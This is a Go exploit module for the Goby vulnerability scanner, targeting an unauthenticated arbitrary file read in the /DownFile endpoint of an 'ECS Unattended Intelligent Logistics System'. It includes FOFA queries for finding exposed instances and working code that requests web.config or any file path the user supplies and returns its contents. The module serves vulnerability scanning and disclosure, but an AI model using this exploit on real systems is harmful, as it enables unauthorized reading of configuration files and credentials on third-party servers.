package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ECS Unattended Intelligent Logistics System /DownFile File Read Vulnerability",
    "Description": "<p>ECS Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and Internet of Things (IoT) technology. It is capable of autonomously completing logistics operations such as storage, retrieval, sorting, loading and distribution of goods, helping enterprises to realize unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities for the modern logistics industry. The system aims to provide process manufacturing enterprises with an intelligent information platform for the unified control of raw material procurement, sales of finished products and in-plant logistics, and to realize unattended measurement, cost reduction and efficiency improvement, machine substitution for manual labor, and optimization of the logistics resource control system through the integrated management of enterprise-wide production, supply and marketing operations. </p><p>Easylogistics unattended logistics system DownFile arbitrary file reading vulnerability, unauthenticated attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., leading to the website in an extremely insecure state.</p>",
    "Product": "ECS Unattended Intelligent Logistics System",
    "Homepage": "http://eosine.com.cn/index/product.html",
    "DisclosureDate": "2024-11-04",
    "PostTime": "2024-11-05",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"Content/styles/iconfont.css\" || body=\"智能物流无人值守系统\" || body=\"/Content/styles/loginindex.css\"",
    "GobyQuery": "body=\"Content/styles/iconfont.css\" || body=\"智能物流无人值守系统\" || body=\"/Content/styles/loginindex.css\"",
    "Level": "1",
    "Impact": "<p>Easylogistics unattended logistics system DownFile arbitrary file reading vulnerability, unauthenticated attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., leading to the website in an extremely insecure state.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/143488812?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "./web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "易思智能物流无人值守系统 /DownFile 文件读取漏洞",
            "Product": "易思无人值守智能物流系统‌",
            "Description": "<p>易思无人值守智能物流系统‌是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇。该系统旨在为流程生产企业提供原料采购、产成品销售及厂内物流的统一管控智能信息化平台，通过全企业产供销业务的集成管理，实现无人值守计量、降本增效、机器替代人工，优化物流资源管控体系。</p><p>易思智能物流无人值守系统 DownFile 存在任意文件读取漏洞,未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>易思智能物流无人值守系统 DownFile 存在任意文件读取漏洞,未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "ECS Unattended Intelligent Logistics System /DownFile File Read Vulnerability",
            "Product": "ECS Unattended Intelligent Logistics System",
            "Description": "<p>ECS Unattended Intelligent Logistics System is an innovative product that integrates artificial intelligence, robotics and Internet of Things (IoT) technology. It is capable of autonomously completing logistics operations such as storage, retrieval, sorting, loading and distribution of goods, helping enterprises to realize unattended intelligent logistics operations, improve efficiency, reduce costs, and bring new development opportunities for the modern logistics industry. The system aims to provide process manufacturing enterprises with an intelligent information platform for the unified control of raw material procurement, sales of finished products and in-plant logistics, and to realize unattended measurement, cost reduction and efficiency improvement, machine substitution for manual labor, and optimization of the logistics resource control system through the integrated management of enterprise-wide production, supply and marketing operations.&nbsp;</p><p>Easylogistics unattended logistics system DownFile arbitrary file reading vulnerability, unauthenticated attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., leading to the website in an extremely insecure state.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Easylogistics unattended logistics system DownFile arbitrary file reading vulnerability, unauthenticated attackers can read important system files (such as database configuration files, system configuration files), database configuration files, etc., leading to the website in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_ashjfgyasuidftgyashfyugqaweuihfqweghfrtyugquwhiefqweyukgfasyhukdhsdgg := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		requestConfig := httpclient.NewGetRequestConfig("/PublicInfoManage/Upload/DownFile?filePath="+fileUrl)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/PublicInfoManage/Upload/DownFile"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"./web.config": "dependentAssembly",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ashjfgyasuidftgyashfyugqaweuihfqweghfrtyugquwhiefqweyukgfasyhukdhsdgg

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"./web.config", "dependentAssembly"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ashjfgyasuidftgyashfyugqaweuihfqweghfrtyugquwhiefqweyukgfasyhukdhsdgg

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
